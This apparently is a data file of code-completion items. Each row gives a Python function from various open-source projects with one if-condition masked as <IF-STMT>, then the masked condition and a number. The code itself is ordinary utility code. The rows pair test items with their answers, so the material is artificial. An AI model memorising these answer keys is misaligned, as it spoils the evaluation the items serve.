174,"def read_vocab_list(path, max_vocab_size=20000):<tab>vocab = {""<eos>"": 0, ""<unk>"": 1}<tab>with io.open(path, encoding=""utf-8"", errors=""ignore"") as f:<tab><tab>for l in f:<tab><tab><tab>w = l.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>vocab[w] = len(vocab)<tab><tab><tab>if len(vocab) >= max_vocab_size:<tab><tab><tab><tab>break<tab>return vocab",if w not in vocab and w :,125
175,"def n_import_from(self, node):<tab>relative_path_index = 0<tab>if self.version >= 2.5:<tab><tab>if node[relative_path_index].pattr > 0:<tab><tab><tab>node[2].pattr = (""."" * node[relative_path_index].pattr) + node[2].pattr<tab><tab>if self.version > 2.7:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>imports = node[1].pattr<tab><tab><tab><tab>for pattr in imports:<tab><tab><tab><tab><tab>node[1].pattr = pattr<tab><tab><tab><tab><tab>self.default(node)<tab><tab><tab><tab>return<tab><tab><tab>pass<tab>self.default(node)","if isinstance ( node [ 1 ] . pattr , tuple ) :",170
176,"def get(self):<tab>""""""Returns a simple HTML for contact form""""""<tab>if self.user:<tab><tab>user_info = models.User.get_by_id(long(self.user_id))<tab><tab><IF-STMT><tab><tab><tab>self.form.name.data = user_info.name + "" "" + user_info.last_name<tab><tab>if user_info.email:<tab><tab><tab>self.form.email.data = user_info.email<tab>params = {""exception"": self.request.get(""exception"")}<tab>return self.render_template(""boilerplate_contact.html"", **params)",if user_info . name or user_info . last_name :,155
177,"def task_management_menu(activation, request):<tab>""""""Available tasks actions.""""""<tab>actions = []<tab>if request.user.has_perm(activation.flow_class._meta.manage_permission_name):<tab><tab>for transition in activation.get_available_transitions():<tab><tab><tab>if transition.can_proceed(activation):<tab><tab><tab><tab>url = activation.flow_task.get_task_url(<tab><tab><tab><tab><tab>activation.task,<tab><tab><tab><tab><tab>transition.name,<tab><tab><tab><tab><tab>user=request.user,<tab><tab><tab><tab><tab>namespace=request.resolver_match.namespace,<tab><tab><tab><tab>)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>actions.append((transition.name.replace(""_"", "" "").title(), url))<tab>return {""actions"": actions, ""request"": request}",if url :,192
178,"def discover_misago_admin():<tab>for app in apps.get_app_configs():<tab><tab>module = import_module(app.name)<tab><tab>if not hasattr(module, ""admin""):<tab><tab><tab>continue<tab><tab>admin_module = import_module(""%s.admin"" % app.name)<tab><tab>if hasattr(admin_module, ""MisagoAdminExtension""):<tab><tab><tab>extension = getattr(admin_module, ""MisagoAdminExtension"")()<tab><tab><tab>if hasattr(extension, ""register_navigation_nodes""):<tab><tab><tab><tab>extension.register_navigation_nodes(site)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>extension.register_urlpatterns(urlpatterns)","if hasattr ( extension , ""register_urlpatterns"" ) :",169
179,"def dequeue(self):<tab>with self.db(commit=True) as curs:<tab><tab>curs.execute(<tab><tab><tab>""select id, data from task where queue = ? ""<tab><tab><tab>""order by priority desc, id limit 1"",<tab><tab><tab>(self.name,),<tab><tab>)<tab><tab>result = curs.fetchone()<tab><tab>if result is not None:<tab><tab><tab>tid, data = result<tab><tab><tab>curs.execute(""delete from task where id = ?"", (tid,))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return to_bytes(data)",if curs . rowcount == 1 :,138
180,"def readHexStringFromStream(stream):<tab>stream.read(1)<tab>txt = """"<tab>x = b_("""")<tab>while True:<tab><tab>tok = readNonWhitespace(stream)<tab><tab><IF-STMT><tab><tab><tab># stream has truncated prematurely<tab><tab><tab>raise PdfStreamError(""Stream has ended unexpectedly"")<tab><tab>if tok == b_("">""):<tab><tab><tab>break<tab><tab>x += tok<tab><tab>if len(x) == 2:<tab><tab><tab>txt += chr(int(x, base=16))<tab><tab><tab>x = b_("""")<tab>if len(x) == 1:<tab><tab>x += b_(""0"")<tab>if len(x) == 2:<tab><tab>txt += chr(int(x, base=16))<tab>return createStringObject(b_(txt))",if not tok :,190
181,"def test_compute_gradient(self):<tab>for y, y_pred in zip(self.y_list, self.predict_list):<tab><tab>lse_grad = self.lae_loss.compute_grad(y, y_pred)<tab><tab>diff = y_pred - y<tab><tab>if diff > consts.FLOAT_ZERO:<tab><tab><tab>grad = 1<tab><tab><IF-STMT><tab><tab><tab>grad = -1<tab><tab>else:<tab><tab><tab>grad = 0<tab><tab>self.assertTrue(np.fabs(lse_grad - grad) < consts.FLOAT_ZERO)",elif diff < consts . FLOAT_ZERO :,145
182,"def request_get(request, key, default_value=None):<tab>if key in request.args:<tab><tab>return request.args.get(key)<tab>elif key in request.form:<tab><tab>return request.form.get(key)<tab>try:<tab><tab>json_body = request.get_json(force=True, silent=True)<tab><tab><IF-STMT><tab><tab><tab>return json_body[key]<tab><tab>else:<tab><tab><tab>return default_value<tab>except Exception:<tab><tab>return default_value",if key in json_body :,129
183,"def _getResourceData(self, jid, dataname):<tab>""""""Return specific jid's resource representation in internal format. Used internally.""""""<tab>if jid.find(""/"") + 1:<tab><tab>jid, resource = jid.split(""/"", 1)<tab><tab><IF-STMT><tab><tab><tab>return self._data[jid][""resources""][resource][dataname]<tab>elif self._data[jid][""resources""].keys():<tab><tab>lastpri = -129<tab><tab>for r in self._data[jid][""resources""].keys():<tab><tab><tab>if int(self._data[jid][""resources""][r][""priority""]) > lastpri:<tab><tab><tab><tab>resource, lastpri = r, int(self._data[jid][""resources""][r][""priority""])<tab><tab>return self._data[jid][""resources""][resource][dataname]","if self . _data [ jid ] [ ""resources"" ] . has_key ( resource ) :",194
184,"def GetBoundingBoxMin(self):<tab>""""""Get the minimum bounding box.""""""<tab>x1, y1 = 10000, 10000<tab>x2, y2 = -10000, -10000<tab>for point in self._lineControlPoints:<tab><tab>if point[0] < x1:<tab><tab><tab>x1 = point[0]<tab><tab>if point[1] < y1:<tab><tab><tab>y1 = point[1]<tab><tab>if point[0] > x2:<tab><tab><tab>x2 = point[0]<tab><tab><IF-STMT><tab><tab><tab>y2 = point[1]<tab>return x2 - x1, y2 - y1",if point [ 1 ] > y2 :,158
185,"def produce_etag_headers(self, filename):<tab>""""""Produce a dict of curl headers containing etag headers from the download.""""""<tab>headers = {}<tab># If the download file already exists, add some headers to the request<tab># so we don't retrieve the content if it hasn't changed<tab>if os.path.exists(filename):<tab><tab>self.existing_file_size = os.path.getsize(filename)<tab><tab>etag = self.getxattr(self.xattr_etag)<tab><tab>last_modified = self.getxattr(self.xattr_last_modified)<tab><tab><IF-STMT><tab><tab><tab>headers[""If-None-Match""] = etag<tab><tab>if last_modified:<tab><tab><tab>headers[""If-Modified-Since""] = last_modified<tab>return headers",if etag :,182
186,"def _find_orientation_offset(self, header):<tab>(ifd_offset,) = self._unpack(""L"", header[4:])<tab>self.exif_buffer.seek(ifd_offset)<tab># Read tag directory<tab>for _ in range(self._unpack(""H"", self.exif_buffer.read(2))[0]):<tab><tab># Each tag is 12 bytes. HHL4s = tag, type, count, data<tab><tab># Read tag and ignore the rest<tab><tab>(tag,) = self._unpack(""H10x"", self.exif_buffer.read(12))<tab><tab><IF-STMT>  # Orientation tag<tab><tab><tab>self._offset = (<tab><tab><tab><tab>self.exif_buffer.tell() - 4<tab><tab><tab>)  # Back 4 bytes to the start of data<tab><tab><tab>break",if tag == 0x0112 :,197
187,"def _start(self):<tab>try:<tab><tab>await self.fire_event(""pre_request"")<tab>except AbortEvent:<tab><tab>self.logger.debug(""Abort request %s"", self.request)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>self.start_request()<tab><tab><tab>except Exception as exc:<tab><tab><tab><tab>self.finished(exc=exc)",if self . _request is not None :,103
188,"def buildQueryRE(queryText, caseSensitive, wholeWord):<tab>""returns a RegEx pattern for searching for the given queryText""<tab># word detection etc. cannot be done on an encoding-less string:<tab>assert type(queryText) == unicode<tab>pattern = re.escape(queryText)<tab>if wholeWord:<tab><tab><IF-STMT><tab><tab><tab>pattern = ""\\b"" + pattern<tab><tab>if re.search(""\w$"", queryText, re.UNICODE):<tab><tab><tab>pattern = pattern + ""\\b""<tab>flags = re.UNICODE<tab>if not (caseSensitive):<tab><tab>flags |= re.IGNORECASE<tab>return re.compile(pattern, flags)","if re . search ( ""^\w"" , queryText , re . UNICODE ) :",166
189,"def filter(callbackfn):<tab>array = this.to_object()<tab>arr_len = array.get(""length"").to_uint32()<tab>if not callbackfn.is_callable():<tab><tab>raise this.MakeError(""TypeError"", ""callbackfn must be a function"")<tab>T = arguments[1]<tab>res = []<tab>k = 0<tab>while k < arr_len:<tab><tab><IF-STMT><tab><tab><tab>kValue = array.get(str(k))<tab><tab><tab>if callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value:<tab><tab><tab><tab>res.append(kValue)<tab><tab>k += 1<tab>return res  # converted to js array automatically",if array . has_property ( str ( k ) ) :,179
190,"def action(self, params):<tab>if len(params) < 1:<tab><tab>return CommandsResponse(STATUS_ERROR, ""Not enough params"")<tab>else:<tab><tab>vrf_name = params[0]<tab><tab><IF-STMT><tab><tab><tab>vrf_rf = params[1]<tab><tab>else:<tab><tab><tab>vrf_rf = ""ipv4""<tab><tab>from ryu.services.protocols.bgp.operator.internal_api import WrongParamError<tab><tab>try:<tab><tab><tab>return CommandsResponse(<tab><tab><tab><tab>STATUS_OK, self.api.count_single_vrf_routes(vrf_name, vrf_rf)<tab><tab><tab>)<tab><tab>except WrongParamError as e:<tab><tab><tab>return WrongParamResp(e)",if len ( params ) == 2 :,187
191,"def __init__(self, layers):<tab>super(Add, self).__init__()<tab>self.layer_names = []<tab>self.layers = layers<tab>for i, layer in enumerate(self.layers):<tab><tab>if layer.parent is None:<tab><tab><tab>if i == 0:<tab><tab><tab><tab>layer.parent = ""input""<tab><tab><tab>else:<tab><tab><tab><tab>layer.parent = layers[i - 1].name<tab><tab><IF-STMT><tab><tab><tab>name = layer.name<tab><tab>else:<tab><tab><tab>name = layer.__class__.__name__ + str(i)<tab><tab><tab>layer.name = name<tab><tab>self.layer_names.append(name)","if hasattr ( layer , ""name"" ) :",165
192,"def _grouping_intervals(grouping):<tab>last_interval = None<tab>for interval in grouping:<tab><tab># if grouping is -1, we are done<tab><tab>if interval == CHAR_MAX:<tab><tab><tab>return<tab><tab># 0: re-use last group ad infinitum<tab><tab>if interval == 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""invalid grouping"")<tab><tab><tab>while True:<tab><tab><tab><tab>yield last_interval<tab><tab>yield interval<tab><tab>last_interval = interval",if last_interval is None :,124
193,"def infer_expected_xp_and_device(self, x):<tab>xp = backend.get_array_module(x)<tab>if xp is np:<tab><tab>return xp, None<tab>elif xp is cuda.cupy:<tab><tab>return xp, x.device<tab>elif xp is chainerx:<tab><tab>backend_name = x.device.backend.name<tab><tab><IF-STMT><tab><tab><tab>return np, None<tab><tab>elif backend_name == ""cuda"":<tab><tab><tab>return cuda.cupy, cuda.cupy.cuda.Device(x.device.index)<tab>assert False","if backend_name == ""native"" :",142
194,"def _escape_attrib(text):<tab># escape attribute value<tab>try:<tab><tab>if ""&"" in text:<tab><tab><tab>text = text.replace(""&"", ""&amp;"")<tab><tab>if ""<"" in text:<tab><tab><tab>text = text.replace(""<"", ""&lt;"")<tab><tab><IF-STMT><tab><tab><tab>text = text.replace("">"", ""&gt;"")<tab><tab>if '""' in text:<tab><tab><tab>text = text.replace('""', ""&quot;"")<tab><tab>if ""\n"" in text:<tab><tab><tab>text = text.replace(""\n"", ""&#10;"")<tab><tab>return text<tab>except (TypeError, AttributeError):  # pragma: no cover<tab><tab>_raise_serialization_error(text)","if "">"" in text :",160
195,"def get_block_id_at_height(store, height, descendant_id):<tab>if height is None:<tab><tab>return None<tab>while True:<tab><tab>block = store._load_block(descendant_id)<tab><tab>if block[""height""] == height:<tab><tab><tab>return descendant_id<tab><tab>descendant_id = block[<tab><tab><tab>""search_id""<tab><tab><tab><IF-STMT><tab><tab><tab>else ""prev_id""<tab><tab>]","if util . get_search_height ( block [ ""height"" ] ) >= height",122
196,"def train(config, checkpoint_dir=None):<tab>if checkpoint_dir:<tab><tab>assert os.path.exists(checkpoint_dir)<tab>for step in range(10):<tab><tab><IF-STMT><tab><tab><tab>with tune.checkpoint_dir(step=step) as checkpoint_dir:<tab><tab><tab><tab>path = os.path.join(checkpoint_dir, ""checkpoint"")<tab><tab><tab><tab>with open(path, ""w"") as f:<tab><tab><tab><tab><tab>f.write(json.dumps({""step"": step}))<tab><tab>tune.report(test=step)",if step % 3 == 0 :,137
197,"def onMinimize(self, sender):<tab>if self._runDialogListener(""onMinimize"") is False:<tab><tab>return<tab>widget = self.child<tab>if widget is not None:<tab><tab>if widget.isVisible():<tab><tab><tab>widget.setVisible(False)<tab><tab><tab>self.setHeight("""")<tab><tab><tab>self.setWidth("""")<tab><tab><tab>if self._maximized:<tab><tab><tab><tab>self._minimized = self._maximized<tab><tab><tab><tab>self._toggleMaximize()<tab><tab><tab>else:<tab><tab><tab><tab>self._minimized = None<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._toggleMaximize()<tab><tab><tab>widget.setVisible(True)",if self . _minimized is not None :,171
198,"def apply_transformation(self, ti: TransformationInput) -> Transformation:<tab># Insert fragments after the last line.<tab>if ti.lineno == ti.document.line_count - 1:<tab><tab>buffer = ti.buffer_control.buffer<tab><tab><IF-STMT><tab><tab><tab>suggestion = buffer.suggestion.text<tab><tab>else:<tab><tab><tab>suggestion = """"<tab><tab>return Transformation(fragments=ti.fragments + [(self.style, suggestion)])<tab>else:<tab><tab>return Transformation(fragments=ti.fragments)",if buffer . suggestion and ti . document . is_cursor_at_the_end :,139
199,"def get_measurements(self, pipeline, object_name, category):<tab>if object_name == IMAGE and category == C_COUNT:<tab><tab>return [self.object_name.value]<tab>elif object_name == self.object_name:<tab><tab><IF-STMT><tab><tab><tab>return [<tab><tab><tab><tab>FTR_CENTER_X,<tab><tab><tab><tab>FTR_CENTER_Y,<tab><tab><tab>]<tab><tab>elif category == C_NUMBER:<tab><tab><tab>return [FTR_OBJECT_NUMBER]<tab><tab>elif category == C_WORMS:<tab><tab><tab>return [F_ANGLE]<tab>return []",if category == C_LOCATION :,151
200,"def traverse(tensors):<tab>""""""traverse all ops to find attached workload""""""<tab>for t in tensors:<tab><tab>op = t.op<tab><tab><IF-STMT><tab><tab><tab>return args_to_workload(op.attrs[""workload""])<tab><tab>wkl = traverse(op.input_tensors)<tab><tab>if wkl:<tab><tab><tab>return wkl<tab>return None","if ""workload"" in op . attrs :",97
201,"def _pack(converter, node: Any, inputs: List[str]) -> Any:<tab>final_inputs = []<tab>for x_in in inputs:<tab><tab>input_c = converter.outputs[x_in]<tab><tab><IF-STMT><tab><tab><tab>final_inputs.append(_nodef_to_private_pond(converter, input_c))<tab><tab>else:<tab><tab><tab>final_inputs.append(input_c)<tab>return converter.protocol.stack(final_inputs, axis=node.attr[""axis""].i)","if isinstance ( input_c , tf . compat . v1 . NodeDef ) :",139
202,"def __init__(self, instance=None, data=empty, **kwargs):<tab>context = kwargs.get(""context"", {})<tab>if ""product"" in context:<tab><tab>instance = self.get_instance(context, data, kwargs)<tab><tab><IF-STMT><tab><tab><tab>quantity = self.fields[""quantity""].to_internal_value(data[""quantity""])<tab><tab>else:<tab><tab><tab>quantity = self.fields[""quantity""].default<tab><tab>instance.setdefault(""quantity"", quantity)<tab><tab>super().__init__(instance, data, context=context)<tab>else:<tab><tab>super().__init__(instance, data, **kwargs)","if data is not empty and ""quantity"" in data :",154
203,"def serialize(self, value):<tab>if value is not None:<tab><tab>try:<tab><tab><tab>iter(value)<tab><tab>except TypeError:<tab><tab><tab>value = [value]<tab><tab><IF-STMT><tab><tab><tab>return [self.element_serialize(val) for val in sorted(value)]<tab>return None",if len ( value ) :,77
204,"def remove_cloner_curve(self, obj_index):<tab># opportunity to remove the .cloner.<tab>if self.selected_mode == ""Duplicate"":<tab><tab>curve_name = f""{self.basedata_name}.cloner.{obj_index:04d}""<tab><tab>cu = bpy.data.curves.get(curve_name)<tab><tab><IF-STMT><tab><tab><tab>bpy.data.curves.remove(cu)",if cu :,107
205,"def update_advance_paid(self):<tab>advance_paid = frappe._dict()<tab>for d in self.get(""accounts""):<tab><tab><IF-STMT><tab><tab><tab>if d.reference_type in (<tab><tab><tab><tab>""Sales Order"",<tab><tab><tab><tab>""Purchase Order"",<tab><tab><tab><tab>""Employee Advance"",<tab><tab><tab>):<tab><tab><tab><tab>advance_paid.setdefault(d.reference_type, []).append(d.reference_name)<tab>for voucher_type, order_list in iteritems(advance_paid):<tab><tab>for voucher_no in list(set(order_list)):<tab><tab><tab>frappe.get_doc(voucher_type, voucher_no).set_total_advance_paid()",if d . is_advance :,177
206,"def handle(self, msg):<tab>self._mic.send(msg)<tab>for calculate_seed, make_delegate, dict in self._delegate_records:<tab><tab>id = calculate_seed(msg)<tab><tab>if id is None:<tab><tab><tab>continue<tab><tab>elif isinstance(id, collections.Hashable):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab><tab>dict[id] = d<tab><tab><tab><tab>dict[id].start()<tab><tab>else:<tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab>d.start()",if id not in dict or not dict [ id ] . is_alive ( ) :,192
207,"def _get_default_factory(self, attribute_name: str) -> Any:<tab>if hasattr(self, attribute_name):<tab><tab>if str(getattr(self, attribute_name)).startswith(""${""):<tab><tab><tab>return str(getattr(self, attribute_name))<tab><tab><IF-STMT><tab><tab><tab>return str(self.__dataclass_fields__[attribute_name].default)<tab><tab>elif (<tab><tab><tab>getattr(self, attribute_name)<tab><tab><tab>!= self.__dataclass_fields__[attribute_name].default_factory()<tab><tab>):<tab><tab><tab>return getattr(self, attribute_name)<tab>return self.__dataclass_fields__[attribute_name].default_factory()","elif str ( self . __dataclass_fields__ [ attribute_name ] . default ) . startswith ( ""${"" ) :",173
208,"def showMenu(self, show):<tab>if show:<tab><tab><IF-STMT><tab><tab><tab>self.canvas.menu = Menu(self.canvas, tearoff=0)<tab><tab><tab>self.canvas.menu.add_command(label=""delete"", command=self._delete)<tab><tab><tab>self.canvas.menu.bind(""<FocusOut>"", lambda e: self.canvas.menu.unpost())<tab><tab>self._bindMenu()<tab>else:<tab><tab># need to go through and unbind...<tab><tab>pass",if self . canvas . menu is None :,127
209,"def __init__(self, db, where=None):<tab>self._db = db<tab>self._tables = []<tab>self.filters = []<tab>if hasattr(where, ""get_all""):<tab><tab>self.where = where<tab><tab>self._tables.insert(0, where.get_all)<tab>elif hasattr(where, ""get_one"") and isinstance(where.get_one, QueryException):<tab><tab>self.where = where.get_one<tab>else:<tab><tab># find out which tables are involved<tab><tab><IF-STMT><tab><tab><tab>self.filters = where.left<tab><tab>self.where = where<tab><tab>self._tables = [field._tablename for (field, op, val) in self.filters]","if isinstance ( where , Query ) :",174
210,"def main():<tab>try:<tab><tab>from wsgiref.simple_server import make_server<tab><tab>from wsgiref.validate import validator<tab><tab><IF-STMT><tab><tab><tab>port[0] = get_open_port()<tab><tab>wsgi_application = WsgiApplication(soap11_application)<tab><tab>server = make_server(host, port[0], validator(wsgi_application))<tab><tab>logger.info(""Starting interop server at %s:%s."" % (""0.0.0.0"", port[0]))<tab><tab>logger.info(""WSDL is at: /?wsdl"")<tab><tab>server.serve_forever()<tab>except ImportError:<tab><tab>print(""Error: example server code requires Python >= 2.5"")",if port [ 0 ] == 0 :,177
211,"def try_adjust_widgets(self):<tab>if hasattr(self.parent, ""adjust_widgets""):<tab><tab>self.parent.adjust_widgets()<tab>if hasattr(self.parent, ""parentApp""):<tab><tab><IF-STMT><tab><tab><tab>self.parent.parentApp._internal_adjust_widgets()<tab><tab>if hasattr(self.parent.parentApp, ""adjust_widgets""):<tab><tab><tab>self.parent.parentApp.adjust_widgets()","if hasattr ( self . parent . parentApp , ""_internal_adjust_widgets"" ) :",118
212,"def copy_file_replace_line(<tab>orig_file: Path, new_file: Path, line_re: str, new_line: str) -> None:<tab>old_version_fh = orig_file.open(""r"")<tab>new_version_fh = new_file.open(""w"")<tab>for line in old_version_fh:<tab><tab><IF-STMT><tab><tab><tab>new_version_fh.write(new_line + ""\n"")<tab><tab>else:<tab><tab><tab>new_version_fh.write(line)<tab>old_version_fh.close()<tab>new_version_fh.close()","if re . search ( line_re , line ) :",154
213,"def _protoc_plugin_parameters(self, language):<tab>""""""Return a tuple of (plugin path, vars) used as parameters for ninja build.""""""<tab>path, vars = """", {}<tab>for p in self.attr[""protoc_plugins""]:<tab><tab><IF-STMT><tab><tab><tab>path = p.path<tab><tab><tab>flag = p.protoc_plugin_flag(self.build_dir)<tab><tab><tab>vars = {""protoc%spluginflags"" % language: flag}<tab><tab><tab>break<tab>return path, vars",if language in p . code_generation :,125
214,"def scan_page(self, address_space, page_offset, fullpage=False):<tab>""""""Runs through patchers for a single page""""""<tab><IF-STMT><tab><tab>pagedata = address_space.read(page_offset, PAGESIZE)<tab>for patcher in self.patchers:<tab><tab>for offset, data in patcher.get_constraints():<tab><tab><tab>if fullpage:<tab><tab><tab><tab>testdata = pagedata[offset : offset + len(data)]<tab><tab><tab>else:<tab><tab><tab><tab>testdata = address_space.read(page_offset + offset, len(data))<tab><tab><tab>if data != testdata:<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>yield patcher",if fullpage :,166
215,"def OnLeftDClick(self, event):<tab>pt = event.GetPosition()<tab>item, flags = self.tree.HitTest(pt)<tab>if item:<tab><tab>self.log.WriteText(""OnLeftDClick: %s\n"" % self.tree.GetItemText(item))<tab><tab>parent = self.tree.GetItemParent(item)<tab><tab><IF-STMT><tab><tab><tab>self.tree.SortChildren(parent)<tab>event.Skip()",if parent . IsOk ( ) :,111
216,"def drop_pathlist(self, pathlist):<tab>""""""Drop path list""""""<tab>if pathlist:<tab><tab>files = [""r'%s'"" % path for path in pathlist]<tab><tab><IF-STMT><tab><tab><tab>text = files[0]<tab><tab>else:<tab><tab><tab>text = ""["" + "", "".join(files) + ""]""<tab><tab>if self.new_input_line:<tab><tab><tab>self.on_new_line()<tab><tab>self.insert_text(text)<tab><tab>self.setFocus()",if len ( files ) == 1 :,126
217,"def func_set_exporter_funcs_opset_yaml(func_set):<tab>if len(list(func_set)[0].split(""@"")) == 1:<tab><tab>yaml_data = {}<tab><tab>for nnabla_func, impl_funcs in _onnx_func_info.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yaml_data[nnabla_func] = impl_funcs<tab><tab>return yaml.dump(yaml_data, default_flow_style=False)<tab>else:<tab><tab>return yaml.dump(list(func_set), default_flow_style=False)",if nnabla_func in func_set :,150
218,"def object_hook(obj):<tab>obj_len = len(obj)<tab>if obj_len == 1:<tab><tab>if ""$date"" in obj:<tab><tab><tab>return datetime.fromtimestamp(<tab><tab><tab><tab>obj[""$date""] / 1000, tz=timezone.utc<tab><tab><tab>) + timedelta(milliseconds=obj[""$date""] % 1000)<tab><tab>if ""$time"" in obj:<tab><tab><tab>return time(*[int(i) for i in obj[""$time""].split("":"")])<tab>if obj_len == 2 and ""$type"" in obj and ""$value"" in obj:<tab><tab><IF-STMT><tab><tab><tab>return date(*[int(i) for i in obj[""$value""].split(""-"")])<tab>return obj","if obj [ ""$type"" ] == ""date"" :",174
219,"def start(self, para=None, callback=None):<tab>if not self.load():<tab><tab>return<tab>if para != None or self.show():<tab><tab>if para == None:<tab><tab><tab>para = self.para<tab><tab>win = WidgetsManager.getref(""Macros Recorder"")<tab><tab><IF-STMT><tab><tab><tab>win.write(""{}>{}"".format(self.title, para))<tab><tab>if self.asyn and IPy.uimode() != ""no"":<tab><tab><tab>threading.Thread(target=self.runasyn, args=(para, callback)).start()<tab><tab>else:<tab><tab><tab>self.runasyn(para, callback)",if win != None :,159
220,"def user(self):<tab><IF-STMT><tab><tab>_env_username = os.getenv(""CONAN_USERNAME"")<tab><tab>conan_v2_error(<tab><tab><tab>""Environment variable 'CONAN_USERNAME' is deprecated"", _env_username<tab><tab>)<tab><tab>self._conan_user = _env_username or self.default_user<tab><tab>if not self._conan_user:<tab><tab><tab>raise ConanException(""user not defined, but self.user is used in conanfile"")<tab>return self._conan_user",if not self . _conan_user :,134
221,"def _get_vars(cls, func):<tab># log.debug(""Getting vars for %s"", func)<tab>params = inspect.signature(func).parameters.copy()<tab>args = {}<tab># log.debug(""Got %s"", params)<tab>for name, param in params.items():<tab><tab># log.debug(""Checking arg %s, type %s"", name, param.kind)<tab><tab><IF-STMT><tab><tab><tab># log.debug(""Using var %s"", name)<tab><tab><tab>args[name] = _get_variable(name)<tab><tab><tab># log.debug(""Collected var for arg '%s': %s"", name, args[name])<tab>return args",if param . kind is param . POSITIONAL_OR_KEYWORD and param . default is None :,176
222,def parts(self):<tab>klass = self.__class__<tab>this = list()<tab>for token in self:<tab><tab>if token.startswith_fws():<tab><tab><tab>if this:<tab><tab><tab><tab>yield this[0] if len(this) == 1 else klass(this)<tab><tab><tab><tab>this.clear()<tab><tab>end_ws = token.pop_trailing_ws()<tab><tab>this.append(token)<tab><tab><IF-STMT><tab><tab><tab>yield klass(this)<tab><tab><tab>this = [end_ws]<tab>if this:<tab><tab>yield this[0] if len(this) == 1 else klass(this),if end_ws :,153
223,"def start_fileoutput(self):<tab>""""""Start output to configured file.""""""<tab>path = os.path.dirname(self.filename)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(path)<tab><tab>self.fd = self.create_fd()<tab><tab>self.close_fd = True<tab>except IOError:<tab><tab>msg = sys.exc_info()[1]<tab><tab>log.warn(<tab><tab><tab>LOG_CHECK,<tab><tab><tab>""Could not open file %r for writing: %s\n"" ""Disabling log output of %s"",<tab><tab><tab>self.filename,<tab><tab><tab>msg,<tab><tab><tab>self,<tab><tab>)<tab><tab>self.fd = dummy.Dummy()<tab><tab>self.is_active = False<tab>self.filename = None",if path and not os . path . isdir ( path ) :,196
224,"def worksheet_id(self, value):<tab>if self._worksheet:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>else:<tab><tab><tab>raise InvalidArgumentValue(<tab><tab><tab><tab>""This range already has a worksheet with different id set.""<tab><tab><tab>)<tab>self._worksheet_id = value",if self . _worksheet . id == value :,82
225,"def _sanity_check(self, kind, triplets):<tab>route_id = self.data.get(""route_id"", [None])[0]<tab>if route_id or [<tab><tab>k<tab><tab>for k in self.data.keys()<tab><tab>if k[:5] in (""route"", ""smtp-"", ""sourc"", ""secur"", ""local"")<tab>]:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Can only configure detailed settings "" ""for one profile at a time""<tab><tab><tab>)","if len ( triplets ) > 1 or kind != ""profile"" :",138
226,"def _process_property_change(self, msg):<tab>msg = super(Select, self)._process_property_change(msg)<tab>if ""value"" in msg:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif msg[""value""] is None:<tab><tab><tab>msg[""value""] = self.values[0]<tab><tab>else:<tab><tab><tab>if isIn(msg[""value""], self.unicode_values):<tab><tab><tab><tab>idx = indexOf(msg[""value""], self.unicode_values)<tab><tab><tab>else:<tab><tab><tab><tab>idx = indexOf(msg[""value""], self.labels)<tab><tab><tab>msg[""value""] = self._items[self.labels[idx]]<tab>msg.pop(""options"", None)<tab>return msg",if not self . values :,180
227,"def emit(self, record):<tab>msg = record.getMessage()<tab>###<tab>if record.exc_info:<tab><tab>_type, value, tback = record.exc_info<tab><tab>tback_text = """".join(traceback.format_exception(_type, value, tback))<tab><tab><IF-STMT><tab><tab><tab>msg += ""\n""<tab><tab>msg += tback_text<tab>###<tab>self.tktext.insert(<tab><tab>""end"",<tab><tab>msg + ""\n"",<tab><tab>record.levelname,<tab>)",if msg :,129
228,"def _get_pip_index_urls(sources):<tab>index_urls = []<tab>trusted_hosts = []<tab>for source in sources:<tab><tab>url = source.get(""url"")<tab><tab>if not url:<tab><tab><tab>continue<tab><tab>index_urls.append(url)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>host = six.moves.urllib.parse.urlparse(source[""url""]).hostname<tab><tab>trusted_hosts.append(host)<tab>return index_urls, trusted_hosts","if source . get ( ""verify_ssl"" , True ) :",129
229,"def _is_binary(fname, limit=80):<tab>try:<tab><tab>with open(fname, ""rb"") as f:<tab><tab><tab>for i in range(limit):<tab><tab><tab><tab>char = f.read(1)<tab><tab><tab><tab>if char == b""\0"":<tab><tab><tab><tab><tab>return True<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if char == b"""":<tab><tab><tab><tab><tab>return<tab>except OSError as e:<tab><tab>if xp.ON_WINDOWS and is_app_execution_alias(fname):<tab><tab><tab>return True<tab><tab>raise e<tab>return False","if char == b""\n"" :",154
230,"def tearDown(self):<tab>exc, _, _ = sys.exc_info()<tab>if exc:<tab><tab>try:<tab><tab><tab>if hasattr(self, ""obj"") and isinstance(self.obj, SelfDiagnosable):<tab><tab><tab><tab>diags = self.obj.get_error_diagnostics()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>for line in diags:<tab><tab><tab><tab><tab><tab>ROOT_LOGGER.info(line)<tab><tab>except BaseException:<tab><tab><tab>pass<tab>if self.captured_logger:<tab><tab>self.captured_logger.removeHandler(self.log_recorder)<tab><tab>self.log_recorder.close()<tab>sys.stdout = self.stdout_backup<tab>super(BZTestCase, self).tearDown()",if diags :,179
